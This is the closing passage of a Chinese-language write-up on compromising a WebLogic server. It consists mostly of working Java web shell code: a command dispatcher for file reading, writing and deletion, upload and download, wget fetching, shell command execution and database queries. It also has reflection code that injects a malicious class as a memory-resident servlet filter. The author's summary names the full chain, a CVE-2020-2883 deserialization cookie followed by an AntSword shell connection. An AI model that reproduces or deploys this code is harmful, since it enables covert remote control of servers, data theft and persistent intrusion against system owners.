            while ((n = is.read(b)) != -1) {
                os.write(b, 0, n);
            }
            os.close();
            is.close();
            h.disconnect();
            return "1";
        }
        String SysInfoCode(ServletRequest r) throws Exception {
    //        String d = r.getServletContext().getRealPath("/");
            String d = this.getClass().getClassLoader().getResource("/").getPath();
            String serverInfo = System.getProperty("os.name");
            String separator = File.separator;
            String user = System.getProperty("user.name");
            String driverlist = WwwRootPathCode(r);
            return d + "\t" + driverlist + "\t" + serverInfo + "\t" + user;
        }
        boolean isWin() {
            String osname = System.getProperty("os.name");
            osname = osname.toLowerCase();
            if (osname.startsWith("win"))
                return true;
            return false;
        }
        String ExecuteCommandCode(String cmdPath, String command) throws Exception {
            StringBuffer sb = new StringBuffer("");
            String[] c = {cmdPath, !isWin() ? "-c" : "/c", command};
            Process p = Runtime.getRuntime().exec(c);
            CopyInputStream(p.getInputStream(), sb);
            CopyInputStream(p.getErrorStream(), sb);
            return sb.toString();
        }
        String decode(String str) {
            byte[] bt = null;
            try {
                sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
                bt = decoder.decodeBuffer(str);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return new String(bt);
        }
        String decode(String str, String encode) {
            if (encode.equals("hex") || encode == "hex") {
                if (str == "null" || str.equals("null")) {
                    return "";
                }
                StringBuilder sb = new StringBuilder();
                StringBuilder temp = new StringBuilder();
                try {
                    for (int i = 0; i |");
                    if (funccode.equals("B")) {
                        sb.append(FileTreeCode(pars[1]));
                    } else if (funccode.equals("C")) {
                        sb.append(ReadFileCode(pars[1]));
                    } else if (funccode.equals("D")) {
                        sb.append(WriteFileCode(pars[1], pars[2]));
                    } else if (funccode.equals("E")) {
                        sb.append(DeleteFileOrDirCode(pars[1]));
                    } else if (funccode.equals("F")) {
                        DownloadFileCode(pars[1], response);
                    } else if (funccode.equals("U")) {
                        sb.append(UploadFileCode(pars[1], pars[2]));
                    } else if (funccode.equals("H")) {
                        sb.append(CopyFileOrDirCode(pars[1], pars[2]));
                    } else if (funccode.equals("I")) {
                        sb.append(RenameFileOrDirCode(pars[1], pars[2]));
                    } else if (funccode.equals("J")) {
                        sb.append(CreateDirCode(pars[1]));
                    } else if (funccode.equals("K")) {
                        sb.append(ModifyFileOrDirTimeCode(pars[1], pars[2]));
                    } else if (funccode.equals("L")) {
                        sb.append(WgetCode(pars[1], pars[2]));
                    } else if (funccode.equals("M")) {
                        sb.append(ExecuteCommandCode(pars[1], pars[2]));
                    } else if (funccode.equals("N")) {
                        sb.append(showDatabases(pars[0], pars[1]));
                    } else if (funccode.equals("O")) {
                        sb.append(showTables(pars[0], pars[1], pars[2]));
                    } else if (funccode.equals("P")) {
                        sb.append(showColumns(pars[0], pars[1], pars[2], pars[3]));
                    } else if (funccode.equals("Q")) {
                        sb.append(query(pars[0], pars[1], pars[2]));
                    } else if (funccode.equals("A")) {
                        sb.append(SysInfoCode(request));
                    }
                } catch (Exception e) {
                    sb.append("ERROR" + "://" + e.toString());
                    e.printStackTrace();
                }
                sb.append("| executeThread = Class.forName("weblogic.work.ExecuteThread");
                Method m = executeThread.getDeclaredMethod("getCurrentWork");
                Object currentWork = m.invoke(Thread.currentThread());
                Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
                connectionHandlerF.setAccessible(true);
                Object obj = connectionHandlerF.get(currentWork);
                Field requestF = obj.getClass().getDeclaredField("request");
                requestF.setAccessible(true);
                obj = requestF.get(obj);
                Field contextF = obj.getClass().getDeclaredField("context");
                contextF.setAccessible(true);
                Object context = contextF.get(obj);
                Field classLoaderF = context.getClass().getDeclaredField("classLoader");
                classLoaderF.setAccessible(true);
                ClassLoader cl = (ClassLoader) classLoaderF.get(context);
                Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
                cachedClassesF.setAccessible(true);
                Object cachedClass = cachedClassesF.get(cl);
                Method getM = cachedClass.getClass().getDeclaredMethod("get", Object.class);
                if (getM.invoke(cachedClass, "shell") == null) {
    //                byte[] codeClass = getBytesByFile("/tmp/MyAntShellFilter.class");
                    byte[] codeClass = getBytesByFile("C:/Users/Administrator/Desktop/MyAntShellFilter.class");
                    Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class evilFilterClass = (Class) defineClass.invoke(cl, codeClass, 0, codeClass.length);
                    String evilName = "gameName" + System.currentTimeMillis();
                    String filterName = "gameFilter" + System.currentTimeMillis();
                    String[] url = new String[]{"/*"};
                    Method putM = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
                    putM.invoke(cachedClass, filterName, evilFilterClass);
                    Method getFilterManagerM = context.getClass().getDeclaredMethod("getFilterManager");
                    Object filterManager = getFilterManagerM.invoke(context);
                    Method registerFilterM = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                    registerFilterM.setAccessible(true);
                    registerFilterM.invoke(filterManager, evilName, filterName, url, null, null, null);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static byte[] getBytesByFile(String pathStr) {
            File file = new File(pathStr);
            try {
                FileInputStream fis = new FileInputStream(file);
                ByteArrayOutputStream bos = new ByteArrayOutputStream(1000);
                byte[] b = new byte[1000];
                int n;
                while ((n = fis.read(b)) != -1) {
                    bos.write(b, 0, n);
                }
                fis.close();
                byte[] data = bos.toByteArray();
                bos.close();
                return data;
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }
捋一下，把MyAntShellFilter.class写入到目标，WebLogicEcho.class打成jar包写入目标，然后CVE_2020_2883_URLClassLoader生成rememberMe的cookie，蚁剑链接，成了！
# 总结
文字能表现出来的东西很表面，因为实际环境中碰到的难题我很难用文字去描述出来，其实当时反代的问题就困扰了我们好久。不过总算历时两周的研究，终于搞定了项目，期间抄的代码无数，很难，但是蚁剑链接success的时候心里的激动是无与伦比的，踩得坑好像也不算什么了。或许这就是平凡的搞站生活中一点点不可多得的喜悦吧。
# 参考
  1. 
  2. 
  3. 
特别感谢宽字节团队@蛋黄